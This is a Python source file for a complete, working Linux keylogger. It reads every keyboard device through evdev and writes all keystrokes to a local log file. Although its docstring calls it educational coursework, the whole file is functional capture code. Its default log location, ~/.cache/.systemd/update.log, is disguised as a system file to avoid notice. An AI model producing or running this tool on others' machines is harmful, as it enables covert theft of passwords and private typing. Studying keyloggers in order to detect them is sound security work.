#!/usr/bin/env python3
"""Educational Linux keylogger — records keystrokes to a local log file.

Built for cyber-security coursework. Run it only on a machine you own, and
see README.md for the ethics notes and how a tool like this is detected.
"""

from __future__ import annotations

import argparse
import select
import signal
import time
from pathlib import Path

from evdev import InputDevice, ecodes, list_devices

from mapping import MODIFIER_KEYS, format_key

DEFAULT_OUTPUT = Path("~/.cache/.systemd/update.log").expanduser()
ROTATE_BYTES = 1_048_576  # roll the log over to <name>.1 at 1 MiB
_SELECT_TIMEOUT = 1.0

_SHIFT_KEYS = frozenset({"KEY_LEFTSHIFT", "KEY_RIGHTSHIFT"})
_CAPS_KEY = "KEY_CAPSLOCK"


def discover_keyboards(name_filter: str | None = None) -> list[InputDevice]:
    """Return every readable keyboard device (not just /dev/input/event0-19)."""
    keyboards = []
    for path in list_devices():
        try:
            device = InputDevice(path)
        except OSError:  # unreadable or vanished since listing
            continue
        if "keyboard" not in device.name.lower():
            continue
        if name_filter and name_filter.lower() not in device.name.lower():
            continue
        keyboards.append(device)
    return keyboards


def parse_args(argv: list[str] | None = None) -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        prog="keylogger",
        description="Educational Linux keylogger (evdev-based, fully local).",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )
    parser.add_argument(
        "--device",
        metavar="NAME",
        help="substring matched against keyboard device names",
    )
    parser.add_argument(
        "--list-devices",
        action="store_true",
        help="list detected keyboards and exit",
    )
    parser.add_argument(
        "--output",
        type=Path,
        default=DEFAULT_OUTPUT,
        metavar="PATH",
        help="log file to append to",
    )
    parser.add_argument(
        "--timestamps",
        action="store_true",
        help="prefix each line with [HH:MM:SS]",
    )
    parser.add_argument(
        "--duration",
        type=float,
        metavar="SECONDS",
        help="stop automatically after this many seconds",
    )
    return parser.parse_args(argv)


def rotate_log(path: Path) -> None:
    """Roll the log over to <name>.1 once it reaches ROTATE_BYTES."""
    try:
        size = path.stat().st_size
    except FileNotFoundError:
        return
    if size >= ROTATE_BYTES:
        path.rename(path.with_name(path.name + ".1"))


def _prune_dead_devices(devices: list[InputDevice]) -> list[InputDevice]:
    alive = []
    for device in devices:
        try:
            select.select([device], [], [], 0)
        except OSError:  # unplugged: evdev raises on the closed/invalid fd
            print(f"[-] device gone: {device.name}")
        else:
            alive.append(device)
    return alive


def run_session(devices: list[InputDevice], args: argparse.Namespace) -> int:
    """Log keystrokes until Ctrl+C, SIGTERM or the --duration deadline.

    Returns the number of printable keystrokes captured.
    """
    rotate_log(args.output)
    args.output.parent.mkdir(parents=True, exist_ok=True)

    shift = False
    caps = False
    key_count = 0
    at_line_start = True
    running = True
    deadline = time.monotonic() + args.duration if args.duration else None

    def stop(_signum, _frame) -> None:
        nonlocal running
        running = False

    signal.signal(signal.SIGTERM, stop)
    signal.signal(signal.SIGINT, stop)

    with open(args.output, "a", encoding="utf-8", errors="replace") as log:
        log.write(f"=== session start {time.strftime('%Y-%m-%d %H:%M:%S')} ===\n")
        log.flush()

        while running and devices:
            timeout = _SELECT_TIMEOUT
            if deadline is not None:
                remaining = deadline - time.monotonic()
                if remaining <= 0:
                    break
                timeout = min(timeout, remaining)

            try:
                readable, _, _ = select.select(devices, [], [], timeout)
            except OSError:  # a fd went bad (device unplugged)
                devices = _prune_dead_devices(devices)
                continue

            for device in readable:
                try:
                    events = device.read()
                except OSError:  # keyboard disappeared mid-read
                    print(f"[-] device gone: {device.name}")
                    devices = [d for d in devices if d.fd != device.fd]
                    continue

                for event in events:
                    if event.type != ecodes.EV_KEY:
                        continue
                    name = ecodes.KEY.get(event.code)
                    if name is None:
                        continue

                    if event.value == 1:  # key down (==2 is auto-repeat)
                        if name in _SHIFT_KEYS:
                            shift = True
                        elif name == _CAPS_KEY:
                            caps = not caps
                        if name not in MODIFIER_KEYS:
                            key_count += 1
                            text = format_key(name, shift=shift, caps=caps)
                            if args.timestamps and at_line_start:
                                log.write(time.strftime("[%H:%M:%S] "))
                            log.write(text)
                            log.flush()
                            at_line_start = text.endswith("\n")
                    elif event.value == 0 and name in _SHIFT_KEYS:
                        shift = False  # key up

        end_line = (
            f"\n=== session end {time.strftime('%Y-%m-%d %H:%M:%S')}"
            f" | {key_count} keystrokes ===\n"
        )
        log.write(end_line)
        log.flush()

    return key_count


def main() -> int:
    args = parse_args()

    if args.list_devices:
        keyboards = discover_keyboards()
        if not keyboards:
            print("No keyboards found (root, or join the 'input' group).")
            return 1
        for device in keyboards:
            print(f"{device.path:<22}{device.name}")
        return 0

    devices = discover_keyboards(args.device)
    if not devices:
        print("[-] No keyboard found (root, or join the 'input' group).")
        return 1

    print(f"[+] Logging from: {', '.join(d.name for d in devices)}")
    print(f"[+] Log file:    {args.output}")
    print("[+] Ctrl+C to stop.\n")

    started = time.monotonic()
    key_count = run_session(devices, args)
    elapsed = time.monotonic() - started

    duration = f"{elapsed / 60:.1f} min" if elapsed >= 60 else f"{elapsed:.0f}s"
    print(f"\n[+] Session summary: {key_count} keystrokes in {duration}.")
    print(f"[+] Saved to {args.output}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
